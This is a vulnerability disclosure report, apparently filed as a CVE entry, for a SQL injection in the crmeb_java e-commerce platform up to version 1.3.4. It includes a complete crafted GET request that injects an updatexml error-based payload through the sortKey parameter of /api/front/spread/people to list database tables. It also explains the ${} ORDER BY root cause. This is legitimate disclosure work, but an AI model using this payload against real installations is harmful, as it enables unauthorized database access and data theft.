| [Suggested description] There is a SQL Injection vulnerability in crmeb\_java <=1.3.4, caused by the param `sortKey` which is in `${}` format and isn't strictly filtered.  [Vulnerability Type] SQLi  [Vendor of Product] <https://github.com/crmeb/crmeb_java>  [Affected Product Code Base] <=1.3.4  [Affected Component] /api/front/spread/people  [Attack Type] Remote  [Vulnerability details] Make sure the user has at least two promoters. [image](https://user-images.githubusercontent.com/39017274/225491704-d81c32d5-3ac6-4741-b4a1-98e0e250c970.png) Send the crafted request package to the api interface `/api/front/spread/people`  ``` GET /api/front/spread/people?sortKey=updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e),1) HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate content-type: application/json Authori-zation: dbdd777e27b94979adf06fc3fd20ee68 Origin: http://localhost:8082 Connection: close Referer: http://localhost:8082/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site ```  [image](https://user-images.githubusercontent.com/39017274/225491769-3e9b59f3-43b7-4d0d-9fa8-f266a7d986c2.png) [Impact Code execution] true [Cause of vulnerability] The interface `/spread/people` call the function `getSpreadPeopleList` [image](https://user-images.githubusercontent.com/39017274/225492772-814e9e6c-0938-4d72-9c5b-c635fcab958d.png) Make sure the user has secondary promoter, the it will call the function `getSpreadPeopleList`. [image](https://user-images.githubusercontent.com/39017274/225492636-e13a98c3-5311-41a2-868c-05ea0e21d1c3.png) There is a trick that the `order by` statement is only executed if there are at least two promoters. The param `sortKey` is `${}` format and it will be joined to the sql string directly.
